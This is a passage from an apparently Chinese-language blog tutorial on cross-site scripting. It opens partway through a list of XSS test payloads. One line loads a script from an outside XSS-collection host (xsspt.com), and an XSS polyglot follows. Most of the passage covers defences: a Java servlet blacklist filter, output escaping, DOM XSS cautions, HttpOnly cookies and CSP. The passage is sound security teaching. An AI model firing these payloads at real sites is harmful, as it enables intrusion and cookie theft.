class="built_in">window</span>.a==<span class="number">1</span>?<span class="number">1</span>:prompt(a=<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>a=prompt;a(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">confirm(</span>'<span class="attr">1</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://xsspt.com/vA4t1W?1542101296"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="使用GIthub上的终极xss工具"><a href="#使用GIthub上的终极xss工具" class="headerlink" title="使用GIthub上的终极xss工具"></a>使用GIthub上的终极xss工具</h4><p>👉<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener">传送门</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:<span class="comment">/*-/*`/*\`/*'/*"/**/</span>(<span class="comment">/* */</span>oNcliCk=alert() )<span class="regexp">//%0D%0A%0d%0a//</span>&lt;<span class="regexp">/stYle/</span>&lt;<span class="regexp">/titLe/</span>&lt;<span class="regexp">/teXtarEa/</span>&lt;<span class="regexp">/scRipt/</span>--!&gt;<span class="string">\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></span><br></pre></td></tr></table></figure><p>　　它能够检测到存在于HTML属性、HTML文字内容、HTML注释、跳转链接、内联JavaScript字符串、内联CSS 样式表等多种上下文中的XSS漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code>等DOMXSS漏洞，并且能绕过一些XSS过滤器。</p><p>　　只要在网站的各输入框中提交这个字符串，或者把它拼接到URL参数上，就可以进行检测了。</p><h4 id="自动化扫描工具"><a href="#自动化扫描工具" class="headerlink" title="自动化扫描工具"></a>自动化扫描工具</h4><p>　　　除了手动检测之外，还可以使用自动扫描工具寻找xss漏洞，例如 <a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/" target="_blank" rel="noopener">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">w3af</a> 等。</p><h3 id="XSS产生的原因"><a href="#XSS产生的原因" class="headerlink" title="XSS产生的原因"></a>XSS产生的原因</h3><p>　　xss存在的根本原因是，对URL中的参数，对用户输入提交给web server的内容，没有进行充分的过滤。如果我们能够在web程序中，对用户提交的URL中的参数，和提交的所有内容，进行充分的过滤，将所有的不合法的参数和输入内容过滤掉，那么就不会导致在用户的浏览器中执行攻击者自己定制的脚本。</p><p>　　但是，<strong>其实充分而完全的过滤，实际上是无法实现的</strong>。因为攻击者有各种各样的神奇的，你完全想象不到的方式来绕过服务器端的过滤，最典型的就是对URL和参数进行各种的编码，比如escape，encodeURI，encodeURIComponent，8进制，10进制，16进制，来绕过xss过滤。那么我们如何来防御xss呢？</p><h3 id="XSS攻击的防御"><a href="#XSS攻击的防御" class="headerlink" title="XSS攻击的防御"></a>XSS攻击的防御</h3><p>XSS 攻击有两大要素：</p><blockquote><p>1、攻击者提交恶意代码。</p><p>2、浏览器执行恶意代码。</p></blockquote><p>　　比较常规的思路是：<strong>对输入和URL参数进行过滤，对输出进行编码</strong>。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容。然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。<strong>虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的xss攻击</strong>。</p><h4 id="XSS-filter"><a href="#XSS-filter" class="headerlink" title="XSS filter"></a>XSS filter</h4><p>对输入和URL参数进行过滤（黑白名单），常用的xss filter的实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XssFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> </span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        XssHttpServletRequestWrapper xssRequest = <span class="keyword">new</span> XssHttpServletRequestWrapper((HttpServletRequest)request);</span><br><span class="line">        chain.doFilter(xssRequest, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> class XssHttpServletRequestWrapper extends HttpServletRequestWrapper &#123;</span><br><span class="line">    HttpServletRequest orgRequest = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> XssHttpServletRequestWrapper(HttpServletRequest request) &#123;</span><br><span class="line">        <span class="keyword">super</span>(request);</span><br><span class="line">        orgRequest = request;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆盖getParameter方法，将参数名和参数值都做xss过滤。&lt;br/&gt;</span></span><br><span class="line"><span class="comment">     * 如果需要获得原始的值，则通过super.getParameterValues(name)来获取&lt;br/&gt;</span></span><br><span class="line"><span class="comment">     * getParameterNames,getParameterValues和getParameterMap也可能需要覆盖</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">String</span> getParameter(<span class="keyword">String</span> name) &#123;</span><br><span class="line">        <span class="keyword">String</span> value = <span class="keyword">super</span>.getParameter(xssEncode(name));</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = xssEncode(value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 覆盖getHeader方法，将参数名和参数值都做xss过滤。&lt;br/&gt;</span></span><br><span class="line"><span class="comment">     * 如果需要获得原始的值，则通过super.getHeaders(name)来获取&lt;br/&gt;</span></span><br><span class="line"><span class="comment">     * getHeaderNames 也可能需要覆盖</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">String</span> getHeader(<span class="keyword">String</span> name) &#123;</span><br><span class="line">        <span class="keyword">String</span> value = <span class="keyword">super</span>.getHeader(xssEncode(name));</span><br><span class="line">        <span class="keyword">if</span> (value != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = xssEncode(value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将容易引起xss漏洞的半角字符直接替换成全角字符</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param s</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> xssEncode(<span class="keyword">String</span> s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(s.length() + <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="built_in">char</span> c = s.charAt(i);</span><br><span class="line">            <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＞'</span>);<span class="comment">// 全角大于号</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＜'</span>);<span class="comment">// 全角小于号</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'\''</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'‘'</span>);<span class="comment">// 全角单引号</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'\"'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'“'</span>);<span class="comment">// 全角双引号</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'&amp;'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＆'</span>);<span class="comment">// 全角</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'\\'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＼'</span>);<span class="comment">// 全角斜线</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'#'</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＃'</span>);<span class="comment">// 全角井号</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'%'</span>:    <span class="comment">// &lt; 字符的 URL 编码形式表示的 ASCII 字符（十六进制格式） 是: %3c</span></span><br><span class="line">                processUrlEncoder(sb, s, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                sb.<span class="built_in">append</span>(c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> processUrlEncoder(StringBuilder sb, <span class="keyword">String</span> s, <span class="built_in">int</span> index)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length() &gt;= index + <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(index+<span class="number">1</span>) == <span class="string">'3'</span> &amp;&amp; (s.charAt(index+<span class="number">2</span>) == <span class="string">'c'</span> || s.charAt(index+<span class="number">2</span>) == <span class="string">'C'</span>))&#123;    <span class="comment">// %3c, %3C</span></span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＜'</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(index+<span class="number">1</span>) == <span class="string">'6'</span> &amp;&amp; s.charAt(index+<span class="number">2</span>) == <span class="string">'0'</span>)&#123;    <span class="comment">// %3c (0x3c=60)</span></span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＜'</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;            </span><br><span class="line">            <span class="keyword">if</span>(s.charAt(index+<span class="number">1</span>) == <span class="string">'3'</span> &amp;&amp; (s.charAt(index+<span class="number">2</span>) == <span class="string">'e'</span> || s.charAt(index+<span class="number">2</span>) == <span class="string">'E'</span>))&#123;    <span class="comment">// %3e, %3E</span></span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＞'</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(index+<span class="number">1</span>) == <span class="string">'6'</span> &amp;&amp; s.charAt(index+<span class="number">2</span>) == <span class="string">'2'</span>)&#123;    <span class="comment">// %3e (0x3e=62)</span></span><br><span class="line">                sb.<span class="built_in">append</span>(<span class="string">'＞'</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.<span class="built_in">append</span>(s.charAt(index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最原始的request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> HttpServletRequest getOrgRequest() &#123;</span><br><span class="line">        <span class="keyword">return</span> orgRequest;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最原始的request的静态方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HttpServletRequest getOrgRequest(HttpServletRequest req) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req <span class="keyword">instanceof</span> XssHttpServletRequestWrapper) &#123;</span><br><span class="line">            <span class="keyword">return</span> ((XssHttpServletRequestWrapper) req).getOrgRequest();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> req;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在web.xml中配置该filter：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">filter</span>&gt;</span><br><span class="line">        &lt;<span class="built_in">filter</span>-name&gt;xssFilter&lt;/<span class="built_in">filter</span>-name&gt;</span><br><span class="line">        &lt;<span class="built_in">filter</span>-<span class="keyword">class</span>&gt;com.xxxxxx.<span class="built_in">filter</span>.XssFilter&lt;/<span class="built_in">filter</span>-<span class="keyword">class</span>&gt;</span><br><span class="line">    &lt;/<span class="built_in">filter</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">filter</span>-mapping&gt;</span><br><span class="line">        &lt;<span class="built_in">filter</span>-name&gt;xssFilter&lt;/<span class="built_in">filter</span>-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/<span class="built_in">filter</span>-mapping&gt;</span><br></pre></td></tr></table></figure><p>　　主要的思路就是<strong>将容易导致XSS攻击的边角字符替换成全角字符</strong>。<code>&lt;</code>和<code>&gt;</code>是脚本执行和各种html标签需要的，比如 <code>&lt;script&gt;</code>，<code>&amp;</code>和 <code>#</code>以及 <code>%</code>在对URL编码试图绕过xss filter时，会出现。我们说对输入的过滤分为白名单和黑名单。上面的xss filter就是一种黑名单的过滤，黑名单就是列出不能出现的对象的清单，一旦出现就进行处理。还有一种白名单的过滤，白名单就是列出可被接受的内容，比如规定所有的输入只能是<code>大小写的26个英文字母</code>和<code>10个数字</code>，还有<code>-</code>和<code>_</code>，所有其他的输入都是非法的，会被抛弃掉。很显然如此严格的白名单是可以100%拦截所有的xss攻击的，但是现实情况一般是不能进行如此严格的白名单过滤的。</p><p>　　对于输入，处理使用xss filter之外，对于每一个输入，在客户端和服务器端还要进行各种验证，验证是否合法字符，长度是否合法，格式是否正确。在客户端和服务端都要进行验证，因为客户端的验证很容易被绕过。其实这种验证也分为了黑名单和白名单。黑名单的验证就是不能出现某些字符，白名单的验证就是只能出现某些字符。尽量使用白名单，虽然白名单无法完全杜绝xss，但是使用不当的话可能会带来很高的误报率。</p><h4 id="存储型和反射型XSS攻击的防御"><a href="#存储型和反射型XSS攻击的防御" class="headerlink" title="存储型和反射型XSS攻击的防御"></a>存储型和反射型XSS攻击的防御</h4><p>　　存储型和反射型xss都是在服务端取出恶意代码后，插入到响应HTML里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。</p><p>预防这两种漏洞，有两种常见做法：</p><ul><li><strong>改成纯前端渲染，把代码和数据分隔开。</strong></li></ul><p>纯前端渲染的过程：</p><p>1、浏览器先加载一个静态HTML，此HTML中不包含任何跟业务相关的数据。</p><p>2、然后浏览器执行HTML中的JavaScript。</p><p>3、JavaScript通过Ajax加载业务数据，调用DOM API更新到页面上。</p><p>　　在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本<code>.innerText</code>，还是属性<code>.setAttribute</code>，还是样式<code>.style</code>等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。</p><p>　　但纯前端渲染还需注意避免DOM型xss漏洞，例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等。在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接HTML的问题。</p><ul><li><strong>对HTML做充分转义。</strong></li></ul><p>　　如果拼接HTML是必要的，就需要采用合适的转义库，对HTML模板各处插入点进行充分的转义。</p><p>　　对于HTML转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#39; /</code> 这几个字符转义掉，确实能起到一定的xss防护作用，但并不完善。要完善xss防护措施，要使用更完善更细致的转义策略。例如Java工程里，常用的转义库为 <code>org.owasp.encoder</code>。</p><table><thead><tr><th align="left">XSS 安全漏洞</th><th>简单转义是否有防护作用</th></tr></thead><tbody><tr><td align="left">HTML 标签文字内容</td><td>有</td></tr><tr><td align="left">HTML 属性值</td><td>有</td></tr><tr><td align="left">CSS 内联样式</td><td>无</td></tr><tr><td align="left">内联 JavaScript</td><td>无</td></tr><tr><td align="left">内联 JSON</td><td>无</td></tr><tr><td align="left">跳转链接</td><td>无</td></tr></tbody></table><p>　　在输出数据之前对潜在的威胁的字符进行编码、转义对xss攻击能起到一定的防御作用。</p><p>　　对所有要动态输出到页面的内容，通通进行相关的编码和转义。当然转义是按照其输出的上下文环境来决定如何转义的。</p><p>作为body文本输出，html标签的属性输出，比如：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>$</span><span class="template-variable">&#123;username&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;username&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span><span class="tag">&lt;/<span class="name">c:out</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;username&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><p>此时的转义规则如下：</p><p><code>&lt;</code>转成 <code>&amp;lt;</code>　　<code>&gt;</code>转成 <code>&amp;gt;</code>　　<code>&amp;</code> 转成 <code>&amp;amp;</code>　　<code>&quot;</code>转成 <code>&amp;quot;</code></p><p><code>&#39;</code>转成 <code>&amp;#39</code>　　<code>\</code>转成<code>\\</code>　　　<code>/</code>转成 <code>\/</code>　　<code>;</code>转成 <code>；(全角;)</code></p><p>javascript事件</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> οnclick=<span class="symbol">'go_to_url</span>(<span class="string">"$&#123;myUrl&#125;"</span>);' /&gt;</span><br></pre></td></tr></table></figure><p>URL属性</p><p>　　如果 <code>&lt;script&gt;、&lt;style&gt;、&lt;imt&gt;</code>等标签的 src 和 href 属性值为动态内容，那么要确保这些URL没有执行恶意连接。确保：<code>href</code>和 <code>src</code>的值必须以 <code>http://</code>开头，白名单方式；不能有<code>10进制</code>和<code>16进制</code>编码字符。</p><h4 id="DOM型XSS攻击的防御"><a href="#DOM型XSS攻击的防御" class="headerlink" title="DOM型XSS攻击的防御"></a>DOM型XSS攻击的防御</h4><p>　　DOM型xss攻击，实际上就是网站前端JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>　　在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为HTML插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>　　如果用Vue/React技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端render阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的xss隐患。</p><p>　　DOM中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些API，很容易产生安全隐患，请务必避免。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span> </span><br><span class="line"> <span class="tag">&lt; <span class="attr">img</span>   <span class="attr">onclick</span> = <span class="string">"UNTRUSTED"</span>   <span class="attr">onerror</span> = <span class="string">"UNTRUSTED"</span>   <span class="attr">src</span> = <span class="string">"data:image/png,"</span> &gt;</span> </span><br><span class="line"> <span class="comment">&lt;!-- 链接内包含恶意代码 --&gt;</span> </span><br><span class="line"> <span class="tag">&lt; <span class="attr">a</span>   <span class="attr">href</span> = <span class="string">"UNTRUSTED"</span> &gt;</span> 1 <span class="tag">&lt;/ <span class="attr">a</span> &gt;</span> </span><br><span class="line"> <span class="tag">&lt; <span class="attr">script</span> &gt;</span>  </span><br><span class="line"> // setTimeout()/setInterval() 中调用恶意代码 </span><br><span class="line">setTimeout( "UNTRUSTED" )</span><br><span class="line">setInterval( "UNTRUSTED" )</span><br><span class="line"> // location 调用恶意代码 </span><br><span class="line">location.href =  'UNTRUSTED' </span><br><span class="line"> // eval() 中调用恶意代码 </span><br><span class="line"> eval ( "UNTRUSTED" )</span><br><span class="line">  <span class="tag">&lt;/ <span class="attr">script</span> &gt;</span></span><br></pre></td></tr></table></figure><h4 id="其他xss攻击的防御"><a href="#其他xss攻击的防御" class="headerlink" title="其他xss攻击的防御"></a>其他xss攻击的防御</h4><h5 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h5><p>　　xss一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本将无法读取到cookie，但是浏览器还是能够正常使用cookie，这样能有效的防止xss的攻击。</p><p>　　一般的Cookie都是从document对象中获得的，现在浏览器在设置 Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一旦这个HttpOnly被设置，<strong>你在浏览器的 document对象中就看不到Cookie了，而浏览器在浏览的时候不受任何影响</strong>，因为Cookie会被放在浏览器头中发送出去(包括ajax的时候)，应用程序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。</p><h5 id="Content-Security-Policy（内容安全策略）"><a href="#Content-Security-Policy（内容安全策略）" class="headerlink" title="Content Security Policy（内容安全策略）"></a>Content Security Policy（内容安全策略）</h5><p>严格的CSP在XSS的防范中可以起到以下的作用：</p><blockquote><p>禁止加载外域代码，防止复杂的攻击逻辑。</p><p>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</p><p>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</p><p>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</p><p>合理使用上报可以及时发现 XSS，利于尽快修复问题。</p></blockquote><h5 id="输入内容长度控制"><a href="#输入内容长度控制" class="headerlink" title="输入内容长度控制"></a>输入内容长度控制</h5><p>　　对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止xss发生，但可以增加xss攻击的难度。</p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>　　<strong>XSS攻击防御方法：XSS 